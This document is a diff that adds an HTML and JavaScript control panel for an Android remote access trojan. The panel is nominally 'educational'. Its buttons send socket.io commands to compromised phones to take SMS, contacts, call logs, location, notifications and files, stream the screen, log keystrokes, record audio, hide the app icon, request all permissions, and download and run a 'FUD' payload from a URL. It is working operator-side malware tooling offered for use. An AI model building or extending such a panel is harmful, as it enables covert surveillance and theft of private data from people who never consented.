@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Admin Dashboard - Ultra Advanced</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .header h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .stat-card h3 {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-bottom: 10px;
+        }
+
+        .stat-card .value {
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .devices-section {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .device-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .device-card:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .device-card.selected {
+            border: 2px solid #4CAF50;
+            background: rgba(76, 175, 80, 0.2);
+        }
+
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .device-name {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .status {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+
+        .status.online {
+            background: #4CAF50;
+        }
+
+        .status.offline {
+            background: #f44336;
+        }
+
+        .device-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .control-panel {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+
+        .command-section {
+            margin-bottom: 20px;
+        }
+
+        .command-section h3 {
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+        }
+
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.3s;
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .btn-danger {
+            background: rgba(244, 67, 54, 0.5);
+        }
+
+        .btn-success {
+            background: rgba(76, 175, 80, 0.5);
+        }
+
+        .btn-warning {
+            background: rgba(255, 152, 0, 0.5);
+        }
+
+        .btn-info {
+            background: rgba(33, 150, 243, 0.5);
+        }
+
+        .output-section {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .output-section h3 {
+            margin-bottom: 15px;
+        }
+
+        .output {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .live-stream {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        .stream-container {
+            background: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .stream-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .stream-controls {
+            margin-top: 15px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .input-group input,
+        .input-group select,
+        .input-group textarea {
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 14px;
+        }
+
+        .input-group textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(76, 175, 80, 0.9);
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            display: none;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            display: block;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            padding: 10px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .tab.active {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>🔐 RAT Admin Dashboard - Ultra Advanced</h1>
+            <p>Remote Access Tool - Educational Purpose Only</p>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Total Devices</h3>
+                <div class="value" id="totalDevices">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Online Devices</h3>
+                <div class="value" id="onlineDevices">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Commands Sent</h3>
+                <div class="value" id="commandsSent">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Data Received</h3>
+                <div class="value" id="dataReceived">0 KB</div>
+            </div>
+        </div>
+
+        <!-- Devices Section -->
+        <div class="devices-section">
+            <h2>📱 Connected Devices</h2>
+            <div id="devicesList"></div>
+        </div>
+
+        <!-- Control Panel -->
+        <div class="control-panel">
+            <h2>🎮 Control Panel</h2>
+            
+            <!-- Tabs -->
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('basic')">Basic</div>
+                <div class="tab" onclick="switchTab('advanced')">Advanced</div>
+                <div class="tab" onclick="switchTab('stealth')">Stealth</div>
+                <div class="tab" onclick="switchTab('stream')">Live Stream</div>
+                <div class="tab" onclick="switchTab('extreme')">Extreme</div>
+            </div>
+
+            <!-- Basic Commands -->
+            <div id="basic" class="tab-content active">
+                <div class="command-section">
+                    <h3>📊 Device Info</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-info" onclick="sendCommand('get_device_info')">Device Info</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_location')">Get Location</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_battery_info')">Battery Info</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_network_info')">Network Info</button>
+                    </div>
+                </div>
+
+                <div class="command-section">
+                    <h3>💬 Communication</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-info" onclick="sendCommand('get_sms')">Get SMS</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_call_logs')">Call Logs</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_contacts')">Contacts</button>
+                    </div>
+                </div>
+
+                <div class="command-section">
+                    <h3>📂 Files</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-info" onclick="sendCommand('list_files', {path: '/sdcard'})">List Files</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_installed_apps')">Installed Apps</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Advanced Commands -->
+            <div id="advanced" class="tab-content">
+                <div class="command-section">
+                    <h3>🖥️ Screen Control</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-success" onclick="sendCommand('read_screen')">Read Screen</button>
+                        <button class="btn btn-success" onclick="sendCommand('get_clickable_elements')">Get Clickables</button>
+                        <button class="btn btn-success" onclick="sendCommand('press_back')">Press Back</button>
+                        <button class="btn btn-success" onclick="sendCommand('press_home')">Press Home</button>
+                    </div>
+                </div>
+
+                <div class="command-section">
+                    <h3>📱 App Management</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-info" onclick="sendCommand('get_all_apps')">All Apps</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_installed_social_apps')">Social Apps</button>
+                    </div>
+                </div>
+
+                <div class="command-section">
+                    <h3>🔔 Notifications</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-info" onclick="sendCommand('get_all_notifications')">All Notifications</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_social_media_notifications')">Social Notifications</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Stealth Commands -->
+            <div id="stealth" class="tab-content">
+                <div class="command-section">
+                    <h3>🙈 Stealth Mode</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-warning" onclick="sendCommand('hide_app_icon')">Hide Icon</button>
+                        <button class="btn btn-success" onclick="sendCommand('show_app_icon')">Show Icon</button>
+                        <button class="btn btn-warning" onclick="sendCommand('enable_stealth_mode')">Enable Stealth</button>
+                        <button class="btn btn-success" onclick="sendCommand('disable_stealth_mode')">Disable Stealth</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_stealth_status')">Stealth Status</button>
+                    </div>
+                </div>
+
+                <div class="command-section">
+                    <h3>🔐 Permissions</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-warning" onclick="sendCommand('request_all_permissions')">Request All Permissions</button>
+                        <button class="btn btn-info" onclick="sendCommand('get_permission_status')">Permission Status</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Live Stream -->
+            <div id="stream" class="tab-content">
+                <div class="live-stream">
+                    <h3>📺 Live Screen Stream</h3>
+                    <div class="stream-container">
+                        <img id="streamImage" src="" alt="Live Stream" style="display: none;">
+                        <div id="streamPlaceholder" style="padding: 100px; text-align: center; background: #000;">
+                            <p>Stream not started</p>
+                        </div>
+                    </div>
+                    <div class="stream-controls">
+                        <button class="btn btn-success" onclick="startStream()">Start Stream</button>
+                        <button class="btn btn-danger" onclick="stopStream()">Stop Stream</button>
+                        <div class="input-group" style="flex: 1;">
+                            <label>FPS:</label>
+                            <input type="number" id="streamFPS" value="15" min="5" max="30">
+                        </div>
+                        <div class="input-group" style="flex: 1;">
+                            <label>Quality:</label>
+                            <input type="number" id="streamQuality" value="50" min="10" max="100">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Extreme Commands -->
+            <div id="extreme" class="tab-content">
+                <div class="command-section">
+                    <h3>⚠️ Extreme Features</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-danger" onclick="sendCommand('start_keylogger')">Start Keylogger</button>
+                        <button class="btn btn-warning" onclick="sendCommand('get_keylogger_logs')">Get Logs</button>
+                        <button class="btn btn-info" onclick="sendCommand('take_screenshot')">Screenshot</button>
+                        <button class="btn btn-info" onclick="sendCommand('record_audio', {duration: 10})">Record Audio (10s)</button>
+                    </div>
+                </div>
+
+                <div class="command-section">
+                    <h3>🔥 FUD Dropper</h3>
+                    <div class="input-group">
+                        <label>Encrypted Payload URL:</label>
+                        <input type="text" id="payloadUrl" placeholder="Enter encrypted URL">
+                    </div>
+                    <div class="button-grid">
+                        <button class="btn btn-danger" onclick="downloadPayload()">Download Payload</button>
+                        <button class="btn btn-danger" onclick="executePayload()">Execute Payload</button>
+                    </div>
+                </div>
+
+                <div class="command-section">
+                    <h3>💣 Danger Zone</h3>
+                    <div class="button-grid">
+                        <button class="btn btn-danger" onclick="confirmAction('self_destruct')">Self Destruct</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Output Section -->
+        <div class="output-section">
+            <h3>📋 Command Output</h3>
+            <div class="output" id="output">Waiting for commands...</div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Socket.io connection
+        const socket = io('http://localhost:5000');
+        
+        let selectedDevice = null;
+        let commandCount = 0;
+        let dataReceived = 0;
+
+        // Connect to server
+        socket.on('connect', () => {
+            showNotification('Connected to server', 'success');
+            requestDeviceList();
+        });
+
+        // Device list
+        socket.on('admin:device_list', (devices) => {
+            updateDeviceList(devices);
+        });
+
+        // Command response
+        socket.on('admin:command_response', (data) => {
+            displayOutput(data);
+            dataReceived += JSON.stringify(data).length;
+            updateStats();
+        });
+
+        // Stream frame
+        socket.on('device:stream_frame', (data) => {
+            const img = document.getElementById('streamImage');
+            img.src = 'data:image/jpeg;base64,' + data.frame;
+            img.style.display = 'block';
+            document.getElementById('streamPlaceholder').style.display = 'none';
+        });
+
+        // Request device list
+        function requestDeviceList() {
+            socket.emit('admin:get_devices');
+        }
+
+        // Update device list
+        function updateDeviceList(devices) {
+            const devicesList = document.getElementById('devicesList');
+            devicesList.innerHTML = '';
+
+            if (devices.length === 0) {
+                devicesList.innerHTML = '<p>No devices connected</p>';
+                return;
+            }
+
+            devices.forEach(device => {
+                const card = document.createElement('div');
+                card.className = 'device-card';
+                if (selectedDevice === device.deviceId) {
+                    card.classList.add('selected');
+                }
+                
+                card.innerHTML = `
+                    <div class="device-header">
+                        <div class="device-name">${device.deviceName || 'Unknown Device'}</div>
+                        <div class="status ${device.online ? 'online' : 'offline'}">
+                            ${device.online ? 'Online' : 'Offline'}
+                        </div>
+                    </div>
+                    <div class="device-info">
+                        <div>ID: ${device.deviceId}</div>
+                        <div>Model: ${device.model || 'N/A'}</div>
+                        <div>Android: ${device.androidVersion || 'N/A'}</div>
+                        <div>Battery: ${device.battery || 'N/A'}%</div>
+                    </div>
+                `;
+                
+                card.onclick = () => selectDevice(device.deviceId);
+                devicesList.appendChild(card);
+            });
+
+            updateStats();
+        }
+
+        // Select device
+        function selectDevice(deviceId) {
+            selectedDevice = deviceId;
+            showNotification('Device selected: ' + deviceId, 'success');
+            requestDeviceList();
+        }
+
+        // Send command
+        function sendCommand(command, params = {}) {
+            if (!selectedDevice) {
+                showNotification('Please select a device first', 'error');
+                return;
+            }
+
+            socket.emit('admin:command', {
+                deviceId: selectedDevice,
+                command: command,
+                params: params
+            });
+
+            commandCount++;
+            updateStats();
+            showNotification('Command sent: ' + command, 'info');
+        }
+
+        // Start stream
+        function startStream() {
+            const fps = document.getElementById('streamFPS').value;
+            const quality = document.getElementById('streamQuality').value;
+            
+            sendCommand('start_live_stream', {
+                fps: parseInt(fps),
+                quality: parseInt(quality)
+            });
+        }
+
+        // Stop stream
+        function stopStream() {
+            sendCommand('stop_live_stream');
+            document.getElementById('streamImage').style.display = 'none';
+            document.getElementById('streamPlaceholder').style.display = 'block';
+        }
+
+        // Download payload
+        function downloadPayload() {
+            const url = document.getElementById('payloadUrl').value;
+            if (!url) {
+                showNotification('Please enter payload URL', 'error');
+                return;
+            }
+            sendCommand('download_payload', { url: url });
+        }
+
+        // Execute payload
+        function executePayload() {
+            if (confirm('Are you sure you want to execute the payload?')) {
+                sendCommand('execute_payload');
+            }
+        }
+
+        // Confirm dangerous action
+        function confirmAction(action) {
+            if (confirm('⚠️ WARNING: This action is irreversible! Continue?')) {
+                sendCommand(action);
+            }
+        }
+
+        // Display output
+        function displayOutput(data) {
+            const output = document.getElementById('output');
+            output.textContent = JSON.stringify(data, null, 2);
+        }
+
+        // Update stats
+        function updateStats() {
+            document.getElementById('commandsSent').textContent = commandCount;
+            document.getElementById('dataReceived').textContent = (dataReceived / 1024).toFixed(2) + ' KB';
+        }
+
+        // Show notification
+        function showNotification(message, type = 'success') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = 'notification show';
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        // Switch tab
+        function switchTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+
+            // Show selected tab
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // Auto-refresh device list
+        setInterval(requestDeviceList, 5000);
+    </script>
+</body>
+</html>
